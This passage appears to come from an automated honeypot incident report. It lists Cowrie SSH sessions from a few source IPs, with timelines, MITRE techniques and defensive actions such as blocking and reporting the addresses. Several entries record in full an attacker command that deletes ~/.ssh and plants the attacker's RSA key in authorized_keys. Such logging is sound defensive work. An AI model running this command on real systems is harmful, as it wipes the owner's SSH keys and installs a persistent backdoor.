| `2026-05-29 21:05:12` | `cowrie.client.kex` |
| `2026-05-29 21:05:13` | `cowrie.login.success` |
| `2026-05-29 21:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb5705828fd

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]36` |
| **First Seen** | 2026-05-29 21:05 |
| **Last Seen** | 2026-05-29 21:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:05:27` | `cowrie.session.connect` |
| `2026-05-29 21:05:27` | `cowrie.client.version` |
| `2026-05-29 21:05:27` | `cowrie.client.kex` |
| `2026-05-29 21:05:28` | `cowrie.login.success` |
| `2026-05-29 21:05:28` | `cowrie.session.params` |
| `2026-05-29 21:05:28` | `cowrie.command.input` |
| `2026-05-29 21:05:28` | `cowrie.command.failed` |
| `2026-05-29 21:05:29` | `cowrie.log.closed` |
| `2026-05-29 21:05:29` | `cowrie.session.params` |
| `2026-05-29 21:05:29` | `cowrie.command.input` |
| `2026-05-29 21:05:29` | `cowrie.session.file_download` |
| `2026-05-29 21:05:29` | `cowrie.log.closed` |
| `2026-05-29 21:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]36` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c7514077214

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]36` |
| **First Seen** | 2026-05-29 21:05 |
| **Last Seen** | 2026-05-29 21:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:05:31` | `cowrie.session.connect` |
| `2026-05-29 21:05:31` | `cowrie.client.version` |
| `2026-05-29 21:05:31` | `cowrie.client.kex` |
| `2026-05-29 21:05:32` | `cowrie.login.success` |
| `2026-05-29 21:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]36` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9acd1d65525d

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:11 |
| **Last Seen** | 2026-05-29 21:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:11:44` | `cowrie.session.connect` |
| `2026-05-29 21:11:44` | `cowrie.client.version` |
| `2026-05-29 21:11:44` | `cowrie.client.kex` |
| `2026-05-29 21:11:45` | `cowrie.login.success` |
| `2026-05-29 21:11:45` | `cowrie.session.params` |
| `2026-05-29 21:11:45` | `cowrie.command.input` |
| `2026-05-29 21:11:45` | `cowrie.command.failed` |
| `2026-05-29 21:11:45` | `cowrie.log.closed` |
| `2026-05-29 21:11:46` | `cowrie.session.params` |
| `2026-05-29 21:11:46` | `cowrie.command.input` |
| `2026-05-29 21:11:46` | `cowrie.session.file_download` |
| `2026-05-29 21:11:46` | `cowrie.log.closed` |
| `2026-05-29 21:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-106a46957c94

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:11 |
| **Last Seen** | 2026-05-29 21:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:11:48` | `cowrie.session.connect` |
| `2026-05-29 21:11:48` | `cowrie.client.version` |
| `2026-05-29 21:11:48` | `cowrie.client.kex` |
| `2026-05-29 21:11:49` | `cowrie.login.success` |
| `2026-05-29 21:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eba0b234e95f

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:11 |
| **Last Seen** | 2026-05-29 21:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:11:51` | `cowrie.session.connect` |
| `2026-05-29 21:11:51` | `cowrie.client.version` |
| `2026-05-29 21:11:51` | `cowrie.client.kex` |
| `2026-05-29 21:11:51` | `cowrie.login.success` |
| `2026-05-29 21:11:51` | `cowrie.session.params` |
| `2026-05-29 21:11:51` | `cowrie.command.input` |
| `2026-05-29 21:11:51` | `cowrie.command.failed` |
| `2026-05-29 21:11:51` | `cowrie.log.closed` |
| `2026-05-29 21:11:51` | `cowrie.session.params` |
| `2026-05-29 21:11:51` | `cowrie.command.input` |
| `2026-05-29 21:11:51` | `cowrie.session.file_download` |
| `2026-05-29 21:11:51` | `cowrie.log.closed` |
| `2026-05-29 21:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a16db425e51

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:11 |
| **Last Seen** | 2026-05-29 21:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:11:52` | `cowrie.session.connect` |
| `2026-05-29 21:11:52` | `cowrie.client.version` |
| `2026-05-29 21:11:52` | `cowrie.client.kex` |
| `2026-05-29 21:11:52` | `cowrie.login.success` |
| `2026-05-29 21:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb1f6017c91

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:13 |
| **Last Seen** | 2026-05-29 21:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:13:31` | `cowrie.session.connect` |
| `2026-05-29 21:13:31` | `cowrie.client.version` |
| `2026-05-29 21:13:31` | `cowrie.client.kex` |
| `2026-05-29 21:13:31` | `cowrie.login.success` |
| `2026-05-29 21:13:32` | `cowrie.session.params` |
| `2026-05-29 21:13:32` | `cowrie.command.input` |
| `2026-05-29 21:13:32` | `cowrie.command.failed` |
| `2026-05-29 21:13:32` | `cowrie.log.closed` |
| `2026-05-29 21:13:32` | `cowrie.session.params` |
| `2026-05-29 21:13:32` | `cowrie.command.input` |
| `2026-05-29 21:13:32` | `cowrie.session.file_download` |
| `2026-05-29 21:13:32` | `cowrie.log.closed` |
| `2026-05-29 21:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0da19b8ec08c

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:13 |
| **Last Seen** | 2026-05-29 21:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:13:33` | `cowrie.session.connect` |
| `2026-05-29 21:13:33` | `cowrie.client.version` |
| `2026-05-29 21:13:33` | `cowrie.client.kex` |
| `2026-05-29 21:13:33` | `cowrie.login.success` |
| `2026-05-29 21:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea91c642efc

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:15 |
| **Last Seen** | 2026-05-29 21:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:15:07` | `cowrie.session.connect` |
| `2026-05-29 21:15:07` | `cowrie.client.version` |
| `2026-05-29 21:15:07` | `cowrie.client.kex` |
| `2026-05-29 21:15:08` | `cowrie.login.success` |
| `2026-05-29 21:15:08` | `cowrie.session.params` |
| `2026-05-29 21:15:08` | `cowrie.command.input` |
| `2026-05-29 21:15:08` | `cowrie.command.failed` |
| `2026-05-29 21:15:09` | `cowrie.log.closed` |
| `2026-05-29 21:15:09` | `cowrie.session.params` |
| `2026-05-29 21:15:09` | `cowrie.command.input` |
| `2026-05-29 21:15:09` | `cowrie.session.file_download` |
| `2026-05-29 21:15:09` | `cowrie.log.closed` |
| `2026-05-29 21:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de6d531f76ed

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:15 |
| **Last Seen** | 2026-05-29 21:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:15:11` | `cowrie.session.connect` |
| `2026-05-29 21:15:11` | `cowrie.client.version` |
| `2026-05-29 21:15:11` | `cowrie.client.kex` |
| `2026-05-29 21:15:12` | `cowrie.login.success` |
| `2026-05-29 21:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-963288ded6d2

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:16 |
| **Last Seen** | 2026-05-29 21:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:16:50` | `cowrie.session.connect` |
| `2026-05-29 21:16:50` | `cowrie.client.version` |
| `2026-05-29 21:16:50` | `cowrie.client.kex` |
| `2026-05-29 21:16:50` | `cowrie.login.success` |
| `2026-05-29 21:16:50` | `cowrie.session.params` |
| `2026-05-29 21:16:50` | `cowrie.command.input` |
| `2026-05-29 21:16:50` | `cowrie.command.failed` |
| `2026-05-29 21:16:50` | `cowrie.log.closed` |
| `2026-05-29 21:16:50` | `cowrie.session.params` |
| `2026-05-29 21:16:50` | `cowrie.command.input` |
| `2026-05-29 21:16:50` | `cowrie.session.file_download` |
| `2026-05-29 21:16:50` | `cowrie.log.closed` |
| `2026-05-29 21:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc5cac65d5e3

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:16 |
| **Last Seen** | 2026-05-29 21:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:16:50` | `cowrie.session.connect` |
| `2026-05-29 21:16:50` | `cowrie.client.version` |
| `2026-05-29 21:16:51` | `cowrie.client.kex` |
| `2026-05-29 21:16:51` | `cowrie.login.success` |
| `2026-05-29 21:16:52` | `cowrie.session.params` |
| `2026-05-29 21:16:52` | `cowrie.command.input` |
| `2026-05-29 21:16:52` | `cowrie.command.failed` |
| `2026-05-29 21:16:52` | `cowrie.log.closed` |
| `2026-05-29 21:16:52` | `cowrie.session.params` |
| `2026-05-29 21:16:52` | `cowrie.command.input` |
| `2026-05-29 21:16:52` | `cowrie.session.file_download` |
| `2026-05-29 21:16:52` | `cowrie.log.closed` |
| `2026-05-29 21:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecb55e3731cb

| Field | Detail |
|---|---|
| **Source IP** | `120.138.6[.]3` |
| **First Seen** | 2026-05-29 21:16 |
| **Last Seen** | 2026-05-29 21:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:16:51` | `cowrie.session.connect` |
| `2026-05-29 21:16:51` | `cowrie.client.version` |
| `2026-05-29 21:16:51` | `cowrie.client.kex` |
| `2026-05-29 21:16:51` | `cowrie.login.success` |
| `2026-05-29 21:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.138.6[.]3` to AbuseIPDB if not already reported
- [ ] Block `120.138.6[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8287790e01ca

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:16 |
| **Last Seen** | 2026-05-29 21:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:16:54` | `cowrie.session.connect` |
| `2026-05-29 21:16:54` | `cowrie.client.version` |
| `2026-05-29 21:16:54` | `cowrie.client.kex` |
| `2026-05-29 21:16:55` | `cowrie.login.success` |
| `2026-05-29 21:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af055bd2c11c

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:18 |
| **Last Seen** | 2026-05-29 21:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:18:32` | `cowrie.session.connect` |
| `2026-05-29 21:18:32` | `cowrie.client.version` |
| `2026-05-29 21:18:32` | `cowrie.client.kex` |
| `2026-05-29 21:18:33` | `cowrie.login.success` |
| `2026-05-29 21:18:33` | `cowrie.session.params` |
| `2026-05-29 21:18:33` | `cowrie.command.input` |
| `2026-05-29 21:18:33` | `cowrie.command.failed` |
| `2026-05-29 21:18:33` | `cowrie.log.closed` |
| `2026-05-29 21:18:33` | `cowrie.session.params` |
| `2026-05-29 21:18:33` | `cowrie.command.input` |
| `2026-05-29 21:18:33` | `cowrie.session.file_download` |
| `2026-05-29 21:18:33` | `cowrie.log.closed` |
| `2026-05-29 21:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a803348aaf2c

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-29 21:18 |
| **Last Seen** | 2026-05-29 21:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 21:18:36` | `cowrie.session.connect` |
| `2026-05-29 21:18:36` | `cowrie.client.version` |
| `2026-05-29 21:18:36` | `cowrie.client.kex` |
| `2026-05-29 21:18:36` | `cowrie.login.success` |
| `2026-05-29 21:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34afbae753c9

| Field | Detail |
|---|---|
| **Source IP** | `87.76.176[.]37` |
| **First Seen** | 2026-05-29 23:06 |
| **Last Seen** | 2026-05-29 23:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
